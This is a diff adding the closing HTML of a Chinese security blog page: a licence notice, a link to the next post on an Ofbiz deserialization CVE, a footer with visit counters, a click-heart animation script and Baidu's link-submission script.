+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）/" rel="next" title="浅析Ofbiz反序列化漏洞（CVE-2020-9496）">
+          浅析Ofbiz反序列化漏洞（CVE-2020-9496）
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
